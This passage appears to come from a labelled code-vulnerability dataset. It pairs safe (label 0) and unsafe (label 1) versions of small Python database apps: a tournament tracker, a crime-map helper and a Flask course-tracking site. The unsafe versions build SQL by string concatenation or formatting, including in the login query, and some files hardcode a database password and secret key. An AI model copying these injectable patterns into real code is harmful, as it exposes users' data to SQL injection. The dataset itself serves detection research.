db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT * FROM pairup;\")\n    rows = c.fetchall()\n    db.close()\n    return list(reversed(rows))\n/n/n/n", "label": 0}, {"id": "2f26b43e26d656190a7dfa0f399e2dc7c0dd9a37", "code": "/tournament.py/n/n#!/usr/bin/env python\n#\n# tournament.py -- implementation of a Swiss-system tournament\n#\n\nimport psycopg2\nimport bleach\n\n\ndef connect():\n    \"\"\"Connect to the PostgreSQL database.  Returns a database connection.\"\"\"\n    return psycopg2.connect(\"dbname=tournament\")\n\n\ndef deleteMatches():\n    \"\"\"Remove all the match records from the database.\"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"DELETE FROM matches;\")\n    db.commit()\n    db.close\n\n\ndef deletePlayers():\n    \"\"\"Remove all the player records from the database.\"\"\"\n    deleteMatches()\n    db = connect()\n    c = db.cursor()\n    c.execute(\"DELETE FROM players;\")\n    db.commit()\n    db.close\n\n\ndef countPlayers():\n    \"\"\"Returns the number of players currently registered.\"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT COUNT(*) FROM players;\")\n    rows = c.fetchall()\n    db.commit()\n    db.close\n    return rows[0][0]\n\n\ndef registerPlayer(name):\n    \"\"\"Adds a player to the tournament database.\n\n    The database assigns a unique serial id number for the player.  (This\n    should be handled by your SQL database schema, not in your Python code.)\n\n    Args:\n      name: the player's full name (need not be unique).\n    \"\"\"\n\n    db = connect()\n    c = db.cursor()\n    c.execute(\"INSERT INTO players (name) values (%s)\", (bleach.clean(name),))\n    db.commit()\n    db.close()\n\n\ndef playerStandings():\n    \"\"\"Returns a list of the players and their win records, sorted by wins.\n\n    The first entry in the list should be the player in first place, or a player\n    tied for first place if there is currently a tie.\n\n    Returns:\n      A list of tuples, each of which contains (id, name, wins, matches):\n        id: the player's unique id (assigned by the database)\n        name: the player's full name (as registered)\n        wins: the number of matches the player has won\n        matches: the number of matches the player has played\n    \"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT * FROM standings\")\n    rows = c.fetchall()\n    db.close()\n    return rows\n\n\ndef reportMatch(winner, loser):\n    \"\"\"Records the outcome of a single match between two players.\n\n    Args:\n      winner:  the id number of the player who won\n      loser:  the id number of the player who lost\n    \"\"\"\n    w = str(winner)\n    l = str(loser)\n    db = connect()\n    c = db.cursor()\n    c.execute(\"INSERT INTO matches values (%s, %s)\" % (w, l))\n    db.commit()\n    db.close()\n\n\ndef swissPairings():\n    \"\"\"Returns a list of pairs of players for the next round of a match.\n\n    Assuming that there are an even number of players registered, each player\n    appears exactly once in the pairings.  Each player is paired with another\n    player with an equal or nearly-equal win record, that is, a player adjacent\n    to him or her in the standings.\n\n    Returns:\n      A list of tuples, each of which contains (id1, name1, id2, name2)\n        id1: the first player's unique id\n        name1: the first player's name\n        id2: the second player's unique id\n        name2: the second player's name\n    \"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT * FROM pairup;\")\n    rows = c.fetchall()\n    db.close()\n    return list(reversed(rows))\n/n/n/n", "label": 1}, {"id": "00f3caeed0e12e806c2808d100908698777d9e98", "code": "tournament.py/n/n#!/usr/bin/env python\n#\n# tournament.py -- implementation of a Swiss-system tournament\n#\n\nimport psycopg2\n\n\ndef connect():\n    \"\"\"Connect to the PostgreSQL database.  Returns a database connection.\"\"\"\n    return psycopg2.connect(\"dbname=tournament\")\n\n\ndef deleteMatches():\n    \"\"\"Remove all the match records from the database.\"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"DELETE FROM matches;\")\n    db.commit()\n    db.close\n\n\ndef deletePlayers():\n    \"\"\"Remove all the player records from the database.\"\"\"\n    deleteMatches()\n    db = connect()\n    c = db.cursor()\n    c.execute(\"DELETE FROM players;\")\n    db.commit()\n    db.close\n\n\ndef countPlayers():\n    \"\"\"Returns the number of players currently registered.\"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT COUNT(*) FROM players;\")\n    rows = c.fetchone()\n    db.close\n    return rows[0]\n\n\ndef registerPlayer(name):\n    \"\"\"Adds a player to the tournament database.\n\n    The database assigns a unique serial id number for the player.  (This\n    should be handled by your SQL database schema, not in your Python code.)\n\n    Args:\n      name: the player's full name (need not be unique).\n    \"\"\"\n\n    db = connect()\n    c = db.cursor()\n    c.execute(\"INSERT INTO players (name) values (%s)\", name)\n    db.commit()\n    db.close()\n\n\ndef playerStandings():\n    \"\"\"Returns a list of the players and their win records, sorted by wins.\n\n    The first entry in the list should be the player in first place, or a player\n    tied for first place if there is currently a tie.\n\n    Returns:\n      A list of tuples, each of which contains (id, name, wins, matches):\n        id: the player's unique id (assigned by the database)\n        name: the player's full name (as registered)\n        wins: the number of matches the player has won\n        matches: the number of matches the player has played\n    \"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT * FROM standings\")\n    rows = c.fetchall()\n    db.close()\n    return rows\n\n\ndef reportMatch(winner, loser):\n    \"\"\"Records the outcome of a single match between two players.\n\n    Args:\n      winner:  the id number of the player who won\n      loser:  the id number of the player who lost\n    \"\"\"\n    try:\n        int(winner)\n        int(loser)\n    except ValueError:\n        raise ValueError(\n            \"\\\"winner\\\" and/or \\\"loser\\\" input are not integers.\\n\"\n            \"Please use the id number of each player to report match results.\"\n        )\n    w = str(winner)\n    l = str(loser)\n    db = connect()\n    c = db.cursor()\n    c.execute(\"INSERT INTO matches values (%s, %s)\", (w,l))\n    db.commit()\n    db.close()\n\n\ndef swissPairings():\n    \"\"\"Returns a list of pairs of players for the next round of a match.\n\n    Assuming that there are an even number of players registered, each player\n    appears exactly once in the pairings.  Each player is paired with another\n    player with an equal or nearly-equal win record, that is, a player adjacent\n    to him or her in the standings.\n\n    Returns:\n      A list of tuples, each of which contains (id1, name1, id2, name2)\n        id1: the first player's unique id\n        name1: the first player's name\n        id2: the second player's unique id\n        name2: the second player's name\n    \"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT * FROM pairup;\")\n    rows = c.fetchall()\n    db.close()\n    return list(reversed(rows))\n/n/n/n", "label": 0}, {"id": "00f3caeed0e12e806c2808d100908698777d9e98", "code": "/tournament.py/n/n#!/usr/bin/env python\n#\n# tournament.py -- implementation of a Swiss-system tournament\n#\n\nimport psycopg2\n\n\ndef connect():\n    \"\"\"Connect to the PostgreSQL database.  Returns a database connection.\"\"\"\n    return psycopg2.connect(\"dbname=tournament\")\n\n\ndef deleteMatches():\n    \"\"\"Remove all the match records from the database.\"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"DELETE FROM matches;\")\n    db.commit()\n    db.close\n\n\ndef deletePlayers():\n    \"\"\"Remove all the player records from the database.\"\"\"\n    deleteMatches()\n    db = connect()\n    c = db.cursor()\n    c.execute(\"DELETE FROM players;\")\n    db.commit()\n    db.close\n\n\ndef countPlayers():\n    \"\"\"Returns the number of players currently registered.\"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT COUNT(*) FROM players;\")\n    rows = c.fetchone()\n    db.close\n    return rows[0]\n\n\ndef registerPlayer(name):\n    \"\"\"Adds a player to the tournament database.\n\n    The database assigns a unique serial id number for the player.  (This\n    should be handled by your SQL database schema, not in your Python code.)\n\n    Args:\n      name: the player's full name (need not be unique).\n    \"\"\"\n\n    db = connect()\n    c = db.cursor()\n    # remove any occurance of quotes/apostrophes to prevent sql injection\n    safe_n = name = name.translate(None, '\\'\\\"')\n    query = \"INSERT INTO players (name) values ('{name}')\".format(name=safe_n)\n    c.execute(query)\n    db.commit()\n    db.close()\n\n\ndef playerStandings():\n    \"\"\"Returns a list of the players and their win records, sorted by wins.\n\n    The first entry in the list should be the player in first place, or a player\n    tied for first place if there is currently a tie.\n\n    Returns:\n      A list of tuples, each of which contains (id, name, wins, matches):\n        id: the player's unique id (assigned by the database)\n        name: the player's full name (as registered)\n        wins: the number of matches the player has won\n        matches: the number of matches the player has played\n    \"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT * FROM standings\")\n    rows = c.fetchall()\n    db.close()\n    return rows\n\n\ndef reportMatch(winner, loser):\n    \"\"\"Records the outcome of a single match between two players.\n\n    Args:\n      winner:  the id number of the player who won\n      loser:  the id number of the player who lost\n    \"\"\"\n    try:\n        int(winner)\n        int(loser)\n    except ValueError:\n        raise ValueError(\n            \"\\\"winner\\\" and/or \\\"loser\\\" input are not integers.\\n\"\n            \"Please use the id number of each player to report match results.\"\n        )\n    w = str(winner)\n    l = str(loser)\n    db = connect()\n    c = db.cursor()\n    statement = \"INSERT INTO matches values ({w}, {l})\".format(w=w, l=l)\n    c.execute(statement)\n    db.commit()\n    db.close()\n\n\ndef swissPairings():\n    \"\"\"Returns a list of pairs of players for the next round of a match.\n\n    Assuming that there are an even number of players registered, each player\n    appears exactly once in the pairings.  Each player is paired with another\n    player with an equal or nearly-equal win record, that is, a player adjacent\n    to him or her in the standings.\n\n    Returns:\n      A list of tuples, each of which contains (id1, name1, id2, name2)\n        id1: the first player's unique id\n        name1: the first player's name\n        id2: the second player's unique id\n        name2: the second player's name\n    \"\"\"\n    db = connect()\n    c = db.cursor()\n    c.execute(\"SELECT * FROM pairup;\")\n    rows = c.fetchall()\n    db.close()\n    return list(reversed(rows))\n/n/n/n", "label": 1}, {"id": "209b23bad13594c9cdf18d8788fcba7c8f68d37b", "code": "dbhelper.py/n/n\nimport pymysql\nimport dbconfig\n\nclass DBhelper:\n    def connect(self,database=\"crimemap\"):\n        return pymysql.connect(host='localhost',\n                               user=dbconfig.db_user,\n                               passwd=dbconfig.db_password,\n                               db=database)\n\n    def get_all_inputs(self):\n        connection=self.connect()\n\n        try:\n            query=\"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n            return cursor.fetchall()\n        finally:\n            connection.close()\n\n\n\n    def add_input(self,data):\n        connection = self.connect()\n\n        try:\n            query = \"INSERT INTO crimes (description) VALUES (%s);\"\n            with connection.cursor() as cursor:\n                cursor.execute(query,data)\n                connection.commit()\n        finally:\n            connection.close()\n\n\n\n    def clear_input(self):\n        connection = self.connect()\n\n        try:\n            query =\"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n/n/n/n", "label": 0}, {"id": "209b23bad13594c9cdf18d8788fcba7c8f68d37b", "code": "/dbhelper.py/n/n\nimport pymysql\nimport dbconfig\n\nclass DBhelper:\n    def connect(self,database=\"crimemap\"):\n        return pymysql.connect(host='localhost',\n                               user=dbconfig.db_user,\n                               passwd=dbconfig.db_password,\n                               db=database)\n\n    def get_all_inputs(self):\n        connection=self.connect()\n\n        try:\n            query=\"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n            return cursor.fetchall()\n        finally:\n            connection.close()\n\n\n\n    def add_input(self,data):\n        connection = self.connect()\n\n        try:\n            query = \"INSERT INTO crimes (description) VALUES ('{}');\".format(data)\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n\n\n    def clear_input(self):\n        connection = self.connect()\n\n        try:\n            query =\"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n/n/n/n", "label": 1}, {"id": "20ef2d4010f9497b8221524edd0c706e2c6a4147", "code": "src/tech_track.py/n/nfrom flask import Flask\nfrom flask import session, redirect, url_for, escape, request\nfrom flask import request\nfrom flaskext.mysql import MySQL\nfrom flask import render_template\nfrom flask import Flask,jsonify,json\nfrom string import Template\n\napp = Flask(__name__)\n\n#Required code to connect to mySQL database.\nmysql = MySQL()\napp = Flask(__name__)\napp.config['MYSQL_DATABASE_USER'] = 'root'\napp.config['MYSQL_DATABASE_PASSWORD'] = '27'\n\napp.config['MYSQL_DATABASE_DB'] = 'TechTrack'\napp.config['MYSQL_DATABASE_HOST'] = 'localhost'\nmysql.init_app(app)\n\n#Homepage\n#TODO: Replace wtih HTML template when created. \n@app.route('/')\ndef index():\n\tif 'username' in session:\n\t\treturn redirect(url_for('instructions'))\n\treturn redirect(url_for('login'))\n\t\n\n@app.route('/instructions')\ndef instructions():\n\tif 'username' in session:\n\t\treturn render_template('instructions.html')\n\treturn redirect(url_for('login'))\n\n#Login Page\n#Default route only answers to GET requests.\n#Can change this by providing methods argument to the route() decorator.\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n\n\terror=None\n\n\t#The request was a POST request, i.e. user is submitting form data.\n\tif request.method == 'POST':\n\n\t\t#Get information from form.\n\t\tusername = request.form['username']\n\t\tpassword = request.form['password']\n\n\t\t#Check database.\n\t\tcursor = mysql.connect().cursor()\n\t\tcursor.execute(\"SELECT * from Users where emailAccount=%s and password=%s\", (username, password))\n\t\tdata = cursor.fetchone()\n\n\t\tif data is None:\n\t\t\terror=\"Username or password is incorrect.\"\n\t\telse:\n\t\t\t#Session.\n\t\t\tsession['username'] = request.form['username']\n\t\t\tsession['lastCourseEntered'] = None\n\t\t\treturn redirect(url_for('instructions'))\n\n\treturn render_template('login.html', error=error)\n\n\n#Register. \n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    error = None\n    if request.method == 'POST':\n        emailAccount = request.form['username']\n        password = request.form['password']\n\n        splitDomainName = emailAccount.split('@')[1]\n        if (splitDomainName != 'purdue.edu'):\n        \terror = \"You should use a Purdue email.\"\n    \t\treturn render_template('createAccount.html', error=error) \n        \n\n        conn = mysql.connect()\n        cursor = conn.cursor()\n    \n        cursor.execute(\"SELECT * from Users where emailAccount=%s\", (emailAccount))\n        data = cursor.fetchone()\n        if data is None:\n            #this password is unique so add it to the database\n            cursor.execute('''INSERT INTO Users (emailAccount, password, isNewUser, cs180Completed, cs240Completed, cs250Completed, cs251Completed, cs314Completed, cs334Completed, cs381Completed, cs307Completed, cs448Completed, cs456Completed, cs422Completed, cs426Completed) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)''',(emailAccount, password, True, False, False, False, False, False, False, False, False, False, False, False, False))\n            conn.commit()\n\n            session['username'] = request.form['username']\n            session['lastCourseEntered'] = None\n\n            return redirect(url_for('instructions'))\n        else: \n            error = \"Username is already in use.\"\n\n    #return \"You are already registered\" #render html for register page and send error message\n    return render_template('createAccount.html', error=error) \n\n#levelPage1\n@app.route('/levelPage1')\ndef levelPage1():\n\tif 'username' in session:\n\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\n\t\tcursor.execute(\"SELECT * from Users where emailAccount=%s\", (session['username']))\n\t\tdata = cursor.fetchone()\n\n\t\tstatus180 = data[3]\n\t\tstatus240 = data[4]\n\t\tstatus250=data[5]\n\t\tstatus251=data[6]\n\n\t\tif status180 is 1:\n\t\t\tstatus180 = 0;\n\t\telse:\n\t\t\tstatus180 = 1;\n\n\t\tif status240 is 1:\n\t\t\tstatus240 = 0;\n\t\telse:\n\t\t\tstatus240 = 1;\n\n\t\tif status250 is 1:\n\t\t\tstatus250 = 0;\n\t\telse:\n\t\t\tstatus250 = 1;\n\t\t\n\t\tif status251 is 1:\n\t\t\tstatus251 = 0;\n\t\telse:\n\t\t\tstatus251 = 1;\n\n\t\ttry:\n\t\t\t#create a instance for filling up levelData\n\t\t\tlevelDict = {\n\t\t\t'level' : 1,\n\t\t\t'classes': [\n\t\t\t\t\t{\n\t\t\t\t\t\t'name': 'CS 180', \n\t\t\t\t\t\t'status': status180\n\t\t\t\t\t}, \n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 240', \n\t\t\t\t\t\t'status':status240\n\t\t\t\t\t}, \n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 250',\n\t\t\t\t\t\t'status':status250\n\t\t\t\t\t}, \n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 251', \n\t\t\t\t\t\t'status':status251\n\t\t\t\t\t} \n\t\t\t\t]\n\t\t\t}\n\t\texcept Exception ,e:\n\t\t\tprint str(e)\n\t\treturn jsonify(levelDict) \n\n\n\t\t#return render_template('levelPage1.html')\n\treturn redirect(url_for('login'))\n\n@app.route('/levelPage2')\ndef levelPage2():\n\tif 'username' in session:\n\t\t\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\n\t\tcursor.execute(\"SELECT * from Users where emailAccount=%s\", (session['username']))\n\t\tdata = cursor.fetchone()\n\t\t#print(data);\n\n\t\tstatus180 = data[3]\n\t\tstatus240 = data[4]\n\t\tstatus250=data[5]\n\t\tstatus251=data[6]\n\t\tstatus314 = data[7]\n\t\tstatus334 = data[8]\n\t\tstatus381=data[9]\n\t\tstatus307=data[10]\n\n\n\t\t#From database: 0 is not completed, 1 is completed\n\t\t#For the JSON: 0 is completed, 1 is not completed and in current level, 2 is prerequisites arent met\n\t\t#If any of level 1's courses are not completed, then user should not be able to do any of level 2 courses\n\t\tif ((status180 is 0) or (status240 is 0) or (status250 is 0) or (status251 is 0)):\n\t\t\tstatus314 = 2;\n\t\t\tstatus334 = 2;\n\t\t\tstatus381 = 2;\n\t\t\tstatus307 = 2;\n\t\telse: \n\t\t\tif status314 is 1:\n\t\t\t\tstatus314 = 0;\n\t\t\telse:\n\t\t\t\tstatus314 = 1;\n\n\t\t\tif status334 is 1:\n\t\t\t\tstatus334 = 0;\n\t\t\telse:\n\t\t\t\tstatus334 = 1;\n\n\t\t\tif status381 is 1:\n\t\t\t\tstatus381 = 0;\n\t\t\telse:\n\t\t\t\tstatus381 = 1;\n\t\t\t\n\t\t\tif status307 is 1:\n\t\t\t\tstatus307 = 0;\n\t\t\telse:\n\t\t\t\tstatus307 = 1;\n\n\n\t\ttry:\n\t\t\t#create a instance for filling up levelData\n\t\t\tlevelDict = {\n\t\t\t'level' : 2,\n\t\t\t'classes': [\n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 307', \n\t\t\t\t\t\t'status':status307\n\t\t\t\t\t},\n\t\t\t\t\t{\n\t\t\t\t\t\t'name': 'CS 314', \n\t\t\t\t\t\t'status': status314\n\t\t\t\t\t}, \n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 334', \n\t\t\t\t\t\t'status':status334\n\t\t\t\t\t}, \n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 381',\n\t\t\t\t\t\t'status':status381\n\t\t\t\t\t} \n\t\t\t\t\t\n\t\t\t\t]\n\t\t\t}\n\t\texcept Exception ,e:\n\t\t\tprint str(e)\n\t\treturn jsonify(levelDict)\n\n\t\t#return render_template('levelPage2.html')\n\treturn redirect(url_for('login'))\n\n@app.route('/levelPage3')\ndef levelPage3():\n\tif 'username' in session:\n\t\t\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\n\t\tcursor.execute(\"SELECT * from Users where emailAccount=%s\", (session['username']))\n\t\tdata = cursor.fetchone()\n\n\t\tstatus180 = data[3]\n\t\tstatus240 = data[4]\n\t\tstatus250=data[5]\n\t\tstatus251=data[6]\n\t\tstatus314 = data[7]\n\t\tstatus334 = data[8]\n\t\tstatus381=data[9]\n\t\tstatus307=data[10]\n\t\tstatus448 = data[11]\n\t\tstatus456 = data[12]\n\t\tstatus426 = data[14]\n\t\tstatus422 = data[13]\n\n\t\tif (status180 is 0) or (status240 is 0) or (status250 is 0) or (status251 is 0) or (status314 is 0) or (status334 is 0) or (status381 is 0) or (status307 is 0):\n\t\t\tstatus448 = 2\n\t\t\tstatus456 = 2\n\t\t\tstatus426 = 2\n\t\t\tstatus422 = 2\n\t\telse: \t\t\n\t\t\tif status448 is 1:\n\t\t\t\tstatus448 = 0\n\t\t\telse:\n\t\t\t\tstatus448 = 1\n\n\t\t\tif status456 is 1:\n\t\t\t\tstatus456 = 0\n\t\t\telse:\n\t\t\t\tstatus456 = 1\n\n\t\t\tif status426 is 1:\n\t\t\t\tstatus426 = 0\n\t\t\telse:\n\t\t\t\tstatus426 = 1\n\n\t\t\tif status422 is 1:\n\t\t\t\tstatus422 = 0\n\t\t\telse:\n\t\t\t\tstatus422 = 1\n\n\t\ttry:\n\t\t\t# Create an instance for filling up classData\n\t\t\tlevelDict = {\n\t\t\t'level': 3,\n\t\t\t'classes': [\n\t\t\t\t{\n\t\t\t\t\t'name':\"CS 422\", \n\t\t\t\t\t'status':status422\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\t\t'name':\"CS 426\",\n\t\t\t\t\t'status':status426\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\t\t'name': \"CS 448\", \n\t\t\t\t\t'status':status448\n\t\t\t\t}, \n\t\t\t\t{\n\t\t\t\t\t'name':\"CS 456\", \n\t\t\t\t\t'status':status456\n\t\t\t\t}, \n\t\t\t\t\n\t\t\t\t\n\t\t\t]}\n\t\t\t\n\t\texcept Exception ,e:\n\t\t\tprint str(e)\n\n\t\treturn jsonify(levelDict)\n\n\treturn redirect(url_for('login'))\n\n\n@app.route('/overview/<classNum>')\ndef overview(classNum):\n\tif 'username' in session:\n\t\tclassNoSpace = classNum.split(' ')[0]+classNum.split(' ')[1]\n\n\t\t#Save the current course as a session variable.\n\t\tsession['currentCourse'] = classNoSpace\n\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\n\t\tcursor.execute(\"SELECT courseName,courseOverview from courses where courseAbbreviation=%s\", (classNoSpace))\n\t\tdata = cursor.fetchone()\n\n\t\treturn render_template('overview.html', className = classNum, courseTitle = data[0], courseOverview = data[1])\n\n\treturn redirect(url_for('index'))\n\n\n#Logout\n\n@app.route('/lastCourseEntered')\ndef lastCourseEntered():\n\tif 'username' in session:\n\t\tif 'lastCourseEntered' in session:\n\t\t\treturn jsonify(session['lastCourseEntered'])\n\t\telse:\n\t\t\treturn jsonify(\"None\")\n\treturn redirect(url_for('login'))\n\n@app.route('/logout')\ndef logout(): \n\tsession.pop('username', None)\n\treturn redirect(url_for('index'))\n\n\n@app.route('/levels')\ndef levels(): \n\tif 'username' in session:\n\t\treturn render_template('hallway.html')\n\treturn redirect(url_for('login'))\n\n\n@app.route('/quiz', methods=['GET', 'POST'])\ndef quiz():\n\n\terror = None\n\tanswers = None\n\tgrades = None\n\tshowSubmit = None\n\tcourse = None\n\trank = None\n\n\tif 'username' in session:\n\n\t\tif 'currentCourse' in session:\n\t\t\tcourse = session['currentCourse']\n\t\telse:\n\t\t\treturn redirect(url_for('levels'))\n\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\t\tcursor.execute(\"SELECT questionString, option1, option2, option3, option4, correctAnswer, courseName FROM courses join questions on questions.courseId=courses.courseId where courses.courseAbbreviation=%s\", (course))\n\n\t\tquestions = []\n\t\tfor row in cursor:\n\t\t\tquestions.append(row)\n\n\t\tif request.method == 'POST':\n\t\t\t#print request.form\n\n\t\t\tif (len(request.form) != 7):\n\t\t\t\terror = \"Please answer all of the questions.\"\n\t\t\t\tshowSubmit = True\n\t\t\telse:\n\t\t\t\tgrades = []\n\t\t\t\tanswers = []\n\t\t\t\tscore = 0\n\n\t\t\t\tfor i in range(0, len(request.form) - 2):\n\t\t\t\t\tanswers.append(int(request.form[\"q\" + str(i+1)]))\n\n\t\t\t\t\tif ( int(questions[i][5]) == answers[i] ):\n\t\t\t\t\t\tgrades.append(1)\n\t\t\t\t\t\tscore = score + 1\n\t\t\t\t\telse:\n\t\t\t\t\t\tgrades.append(0)\n\n\t\t\t\trank = request.form[\"rankquiz\"]\n\n\t\t\t\ttotal = score + 3*int(rank)\n\n\t\t\t\tcursor.execute(\"SELECT courseId FROM courses WHERE courseAbbreviation=%s\", (course))\n\t\t\t\tcourseId = cursor.fetchone()\n\n\t\t\t\tcursor.execute(\"SELECT courseConcentration FROM courses WHERE courseAbbreviation=%s\", (course))\n\t\t\t\tcourseConcentration = cursor.fetchone()\n\n\t\t\t\tcursor.execute(\"DELETE FROM results WHERE emailAccount=%s and courseId=%s\", (session['username'], str(courseId[0])))\n\n\t\t\t\t#print \"INSERT INTO results (emailAccount, courseId, courseConcentration, score, rank, total) VALUES ('\" + session['username'] + \"',\" + str(courseId[0]) + \",'\" + str(courseConcentration[0]) + \"',\" + str(score) + \",\" + str(rank) + \",\" + str(total) + \")\"\n\t\t\t\tcursor.execute(\"INSERT INTO results (emailAccount, courseId, courseConcentration, score, rank, total) VALUES (%s, %s, %s, %s, %s, %s)\", (session['username'], str(courseId[0]), str(courseConcentration[0]), str(score), str(rank), str(total)))\n\t\t\t\tcursor.execute(\"UPDATE users SET \"+course.lower()+\"Completed=1 WHERE emailAccount=%s\", (session['username']))\n\t\t\t\tconn.commit()\n\n\t\t\t\tsession['lastCourseEntered'] = session['currentCourse']\n\t\t\t\tsession.pop('currentCourse', None)\n\t\t\t\t\n\t\t\t\trank = int(rank)\n\t\t\treturn render_template('quiz.html', questions=questions, error=error, answers=answers, grades=grades, rank=rank, showSubmit=showSubmit)\n\t\telse:\n\t\t\tshowSubmit = True\n\t\t\treturn render_template('quiz.html', questions=questions, error=error, answers=answers, grades=grades, rank=rank, showSubmit=showSubmit)\n\treturn redirect(url_for('login'))\n\n@app.route('/summary', methods=['GET'])\ndef summary():\n\tif 'username' in session:\n\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\n\t\t#select the maximum score from the results table\n\t\tcursor.execute(\"SELECT courseConcentration FROM results WHERE total = (SELECT MAX(total) FROM (SELECT * FROM results WHERE courseId > 4) Temp) and courseId > 4 and emailAccount=%s\", (session['username']));\n\t\tcourseConcentration = cursor.fetchone()\n\n\t\treturn render_template('summary.html', courseConcentration = courseConcentration[0])\n\treturn redirect(url_for('login'))\n\n#Secret Key\napp.secret_key = 'A0Zr98j/3yX R~'\n/n/n/n", "label": 0}, {"id": "20ef2d4010f9497b8221524edd0c706e2c6a4147", "code": "/src/tech_track.py/n/nfrom flask import Flask\nfrom flask import session, redirect, url_for, escape, request\nfrom flask import request\nfrom flaskext.mysql import MySQL\nfrom flask import render_template\nfrom flask import Flask,jsonify,json\nfrom string import Template\n\napp = Flask(__name__)\n\n#Required code to connect to mySQL database.\nmysql = MySQL()\napp = Flask(__name__)\napp.config['MYSQL_DATABASE_USER'] = 'root'\napp.config['MYSQL_DATABASE_PASSWORD'] = '27'\n\napp.config['MYSQL_DATABASE_DB'] = 'TechTrack'\napp.config['MYSQL_DATABASE_HOST'] = 'localhost'\nmysql.init_app(app)\n\n#Homepage\n#TODO: Replace wtih HTML template when created. \n@app.route('/')\ndef index():\n\tif 'username' in session:\n\t\treturn redirect(url_for('instructions'))\n\treturn redirect(url_for('login'))\n\t\n\n@app.route('/instructions')\ndef instructions():\n\tif 'username' in session:\n\t\treturn render_template('instructions.html')\n\treturn redirect(url_for('login'))\n\n#Login Page\n#Default route only answers to GET requests.\n#Can change this by providing methods argument to the route() decorator.\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n\n\terror=None\n\n\t#The request was a POST request, i.e. user is submitting form data.\n\tif request.method == 'POST':\n\n\t\t#Get information from form.\n\t\tusername = request.form['username']\n\t\tpassword = request.form['password']\n\n\t\t#Check database.\n\t\tcursor = mysql.connect().cursor()\n\t\tcursor.execute(\"SELECT * from Users where emailAccount='\" + username + \"' and password='\" + password + \"'\")\n\t\tdata = cursor.fetchone()\n\n\t\tif data is None:\n\t\t\terror=\"Username or password is incorrect.\"\n\t\telse:\n\t\t\t#Session.\n\t\t\tsession['username'] = request.form['username']\n\t\t\treturn redirect(url_for('instructions'))\n\n\treturn render_template('login.html', error=error)\n\n\n#Register. \n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    error = None\n    if request.method == 'POST':\n        emailAccount = request.form['username']\n        password = request.form['password']\n\n        splitDomainName = emailAccount.split('@')[1]\n        if (splitDomainName != 'purdue.edu'):\n        \terror = \"You should use a Purdue email.\"\n    \t\treturn render_template('createAccount.html', error=error) \n        \n\n        conn = mysql.connect()\n        cursor = conn.cursor()\n    \n        cursor.execute(\"SELECT * from Users where emailAccount='\" + emailAccount + \"'\")\n        data = cursor.fetchone()\n        if data is None:\n            #this password is unique so add it to the database\n            cursor.execute('''INSERT INTO Users (emailAccount, password, isNewUser, cs180Completed, cs240Completed, cs250Completed, cs251Completed, cs314Completed, cs334Completed, cs381Completed, cs307Completed, cs448Completed, cs456Completed, cs422Completed, cs426Completed) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)''',(emailAccount, password, True, False, False, False, False, False, False, False, False, False, False, False, False))\n            conn.commit()\n\n            session['username'] = request.form['username']\n\n            return redirect(url_for('instructions'))\n        else: \n            error = \"Username is already in use.\"\n\n    #return \"You are already registered\" #render html for register page and send error message\n    return render_template('createAccount.html', error=error) \n\n#levelPage1\n@app.route('/levelPage1')\ndef levelPage1():\n\tif 'username' in session:\n\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\n\t\tcursor.execute(\"SELECT * from Users where emailAccount='\" + session['username'] + \"'\")\n\t\tdata = cursor.fetchone()\n\n\t\tstatus180 = data[3]\n\t\tstatus240 = data[4]\n\t\tstatus250=data[5]\n\t\tstatus251=data[6]\n\n\t\tif status180 is 1:\n\t\t\tstatus180 = 0;\n\t\telse:\n\t\t\tstatus180 = 1;\n\n\t\tif status240 is 1:\n\t\t\tstatus240 = 0;\n\t\telse:\n\t\t\tstatus240 = 1;\n\n\t\tif status250 is 1:\n\t\t\tstatus250 = 0;\n\t\telse:\n\t\t\tstatus250 = 1;\n\t\t\n\t\tif status251 is 1:\n\t\t\tstatus251 = 0;\n\t\telse:\n\t\t\tstatus251 = 1;\n\n\t\ttry:\n\t\t\t#create a instance for filling up levelData\n\t\t\tlevelDict = {\n\t\t\t'level' : 1,\n\t\t\t'classes': 